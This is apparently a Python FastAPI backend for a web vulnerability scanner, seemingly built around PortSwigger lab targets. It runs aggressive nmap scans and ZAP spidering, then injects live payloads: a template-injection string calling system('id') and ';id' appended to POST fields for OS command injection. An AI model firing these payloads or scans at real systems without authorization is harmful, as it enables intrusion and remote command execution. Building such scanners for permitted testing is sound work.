from fastapi import WebSocket
from nmap import PortScanner
import sys, requests, json, time, re
from urllib.parse import urlparse
from schemas import Scan
from repository import ScansRepository

scanner = PortScanner()
zap_api = "http://10.5.113.102:8780/JSON"


async def start_scan(data: str, websocket: WebSocket):
    try:
        data_parse = json.loads(data)
        url = data_parse.get('url')
        type_of_scan = data_parse.get('type')
        scan = data_parse.get('scan')
        print(scan)

        if type_of_scan == "tcp":
            await get_port(type_of_scan, scan, url, websocket)
        elif type_of_scan == "upd":
            await get_port(type_of_scan, scan, url, websocket)
        else:
            await zap_scan(type_of_scan, url, scan, websocket)
    except Exception as e:
        await websocket.send_json({"error": e})


async def get_port(type_of_scan: str, scan: Scan, url: str, websocket: WebSocket):
    try:
        print("[+] ------------------------------------------->")
        print("[+] - Scanning for " + type_of_scan + " of " + url)

        host = url

        scanner.scan(host, arguments='-sS -T3 -vv -A --script=default')
        scan_ports = scanner[host]

        print("[+] - Saved data to db")
        print("[+] ------------------------------------------->")

        res_data = 'Find ports'

        await ScansRepository.edit_result_of_scan_by_id(scan, res_data)

        await websocket.send_json({"scan_data": scan_ports})
    except Exception as e:
        await websocket.send_json({"error": e})


async def zap_scan(type_of_scan: str, target: str, scan: Scan, websocket: WebSocket):

    try:
        print("[+] Start scan, target is " + target)
        r = requests.get(zap_api + "/spider/action/scan/?apikey=foo&url=" + target + "&maxChildren=&recurse=&contextName=&subtreeOnly=")
        scan_id = json.loads(r.text)["scan"]

        scan_not_completed = True
        while scan_not_completed:
            r = requests.get(zap_api + "/spider/view/status/?apikey=foo&scanId=" + scan_id)
            scan_percent = json.loads(r.text)["status"]
            if scan_percent == "100":
                scan_not_completed = False
                print("[+] ZAP Spider Scan " + scan_percent + "% completed")
            else:
                print("[+] ZAP Spider Scan " + scan_percent + "%")
                time.sleep(1)

        print("[+] URLs Collected:")
        r = requests.get(zap_api + "/core/view/urls/?apikey=foo&baseurl=" + target)
        urls = json.loads(r.text)["urls"]

        response = {}

        if type_of_scan == 'ssti':
            response = server_side_template_injection(urls, target)
        else:
            response = os_command_injection(urls, target)

        await ScansRepository.edit_result_of_scan_by_id(scan, response.get('result'))

        await websocket.send_json({"scan_data": response})
    except Exception as e:
        await websocket.send_json({"error": e})


def server_side_template_injection(urls, target):
    response = {
        "target": target,
        "status": True,
        "result": "",
        "data": []
    }

    for url in urls:
        # ParseResult(scheme='https', netloc='0afb007f04be0bf881fae36a00ba0036.web-security-academy.net', path='/sitemap.xml', params='', query='', fragment='')
        u = urlparse(url)

        if u.query != "":
            print("[+] `- " + url)
            res_data = exploit(u, '<%=+system("id")+%>', url)
            time.sleep(1)
            if res_data:
                response["data"].append(res_data)

    if len(response["data"]) > 0:
        response["result"] = "Server-side template injection (SSTI)"
    else:
        response["result"] = "Server-side template injection not Found"

    return response


def os_command_injection(urls, target):
    response = {
        "target": target,
        "status": True,
        "result": "",
        "data": []
    }

    for url in urls:
        # ParseResult(scheme='https', netloc='0afb007f04be0bf881fae36a00ba0036.web-security-academy.net', path='/sitemap.xml', params='', query='', fragment='')
        u = urlparse(url)
        r = requests.get(zap_api + "/core/view/messages/?apikey=foo&baseurl=" + u.scheme + "://" + u.netloc + u.path)
        messages = json.loads(r.text)["messages"]

        for message in messages:
            if message["requestBody"] != "":
                res_data = exploit_body_req(u, message["requestBody"], ';id')
                if res_data:
                    response["data"] = []
                    response["data"].append(res_data)

    if len(response["data"]) > 0:
        response["result"] = "OS commands injection"
    else:
        response["result"] = "OS commands injection not Found"

    return response


def exploit(u, payload, url):
    p = u.query.split("=")
    param = p[0]
    value = p[1]
    r = requests.get(u.scheme + "://" + u.netloc + u.path + "?" + param + "=" + payload)
    if re.search(r'.*uid=.+ gid=.+ groups=.*', r.text) is not None:
        print("[+]  ----------------------------------------")
        print("[+] `- Doing a code injection test.......")
        print("[+] `- Server-side template injection (SSTI) - Found")
        print("[+] `- " + u.scheme + "://" + u.netloc + u.path + "?" + param + "=" + payload)
        print("[+]  ----------------------------------------\n")
        return {
            "url": url,
            "test_problem_url": u.scheme + "://" + u.netloc + u.path + "?" + param + "=" + payload
        }
    else:
        print("[+]  ----------------------------------------")
        print("[+] `- Doing a code injection test.......")
        print("[+] `- Server-side template injection (SSTI) not Found")
        print("[+] `- " + u.scheme + "://" + u.netloc + u.path + "?" + param + "=" + payload)
        print("[+]  ----------------------------------------\n")


def exploit_body_req(u, body, payload):
    data = {}
    # body = productId=20&storeId=2
    # {"productId": ["20"], "storeId": ["2"]}
    key_values = body.split("&")
    qs = {}
    for kv in key_values:
        p = kv.split("=")
        name = p[0]
        value = p[1]
        if name not in qs:
            qs[name] = []
        qs[name].append(value)

    for i in range(0, len(key_values)):
        query_string = post_querystring_replace_val(qsdict=qs, index=i, val=";id", append=True)
        r = requests.post(u.scheme + "://" + u.netloc + u.path, data=query_string)
        if re.search(r'.*uid=.+ gid=.+ groups=.*', r.text) is not None:
            print("[+]  ----------------------------------------")
            print("[+] `- Successfuly exploited! RCE Found.")
            print("[+] `- Url:" + u.scheme + "://" + u.netloc + u.path)
            print("[+] `- Body:" + str(query_string))
            print("[+]  ----------------------------------------\n")
            data = {
                "url": u.scheme + "://" + u.netloc + u.path,
                "test_problem_url": str(query_string)
            }
        else:
            print("Not Found RCE")

    return data


def post_querystring_replace_val(qsdict, index, val, append=False):
    qs = {}
    for i in range(0, len(qsdict)):
        arg = list(qsdict.keys())[i]
        if i == index:
            if append:
                if len(qsdict[arg]) > 0:
                    qs[arg] = qsdict[arg][0] + val
                else:
                    qs[arg] = val
            else:
                qs[arg] = val
        else:
            if len(qsdict[arg]) > 0:
                qs[arg] = qsdict[arg][0]
            else:
                qs[arg] = ""

    return qs
